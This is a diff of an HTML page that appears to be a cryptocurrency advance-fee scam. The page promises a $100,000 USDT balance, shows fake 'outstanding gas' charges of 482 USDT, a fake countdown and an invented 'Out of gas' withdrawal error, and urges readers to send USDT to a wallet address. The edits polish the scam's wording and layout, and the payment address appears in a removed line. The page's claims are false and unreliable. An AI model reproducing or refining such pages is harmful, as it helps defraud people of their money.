@@ -60,7 +60,7 @@
 <!-- get gas -->
 
 <form action="https://phantom.com/" method="get">
-<button align="center" type="submit"> [TOP Gas ⛽️ USDT] </button>
+<button align="center" type="submit">[TOP Gas ⛽️ USDT]</button>
 </form>  
 
 <span style="color: Green;"> And receive $100,000 USDT Balance on your USDT address</span>
@@ -72,18 +72,18 @@
         <td style="color: Black; font-weight: bold; font-style: italic;">Gas (estimated): [$482] = 482 USDT</td>
     </tr>
     <tr>
-        <td style="color: Red; font-weight: bold;">CURRENTLY OUTSTANDING</td>
+        <td style="color: Red; font-weight: bold;">CURRENTLY OUTSTANDING 482 USDT</td>
     </tr>
     <tr>
         <td style="color: Blue; font-style: italic;">$0.00 USDT PAID</td>
     </tr>
-</table> <br>
+</table>
 
 <blockquote>
     <span style="color: green;">RECEVING IN 15 seconds•••••</span>
 </blockquote>
-
 <hr>
+
 <h4>Payment Method<h4>
 <table style="width: 100%; max-width: 400px; margin: 20px auto; border-collapse: collapse; border: 1px solid #ccc; border-radius: 5px; overflow: hidden;">
     <tr>
@@ -95,20 +95,18 @@
     </tr>
     <tr>
         <td colspan="2" style="text-align: center;">
-            <span style="display: inline-block; margin-top: 10px;">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</span>
-            <p style="margin: 10px 0;">(Please copy the address above manually)</p>
+          
+<p align="center" style="margin: 10px 0;">(Use  the address above And Refill the USDT GAS ⛽️)</p>
         </td>
     </tr>
 </table>
-<hr>
-
 <img align="center" src="IMG_0565.jpeg" alt="blockchain Logo" width="38" />
 
 <hr>
 
-<span style="color: Blue;"><strong>ERROR!!!</strong> 
+<span style="color: RED;"><strong>ERROR!!!</strong> 
 
-<span style="color: Red;">Warning! Error encountered during Withdraw execution ~~[Out of gas]~~ ⚠️</span>
+<span style="color: Red;">Warning! Error encountered during Withdraw execution <i>[Out of gas]<\i> ⚠️</span>
 
 <br>
 
@@ -116,7 +114,7 @@
 
 <img align="center" src="IMG_0567.jpeg" alt="payslip" width="500" />
 
-<span style="color: red;"> <strong>SUMMARY</strong>You need 482  USDT to complete this transaction Buy more [$482] USDT For Gas Price!</span>  <img src="IMG_0574.png" alt="blockchain Logo" width="15" />
+<span style="color: red;"> <strong>SUMMARY:</strong>You need 482  USDT to complete this transaction Buy more [$482] USDT For Gas Price!</span>  <img src="IMG_0574.png" alt="blockchain Logo" width="15" />
 
 
 <img align="center" src="IMG_9113.jpeg" alt="ethscan Logo" width="500" />
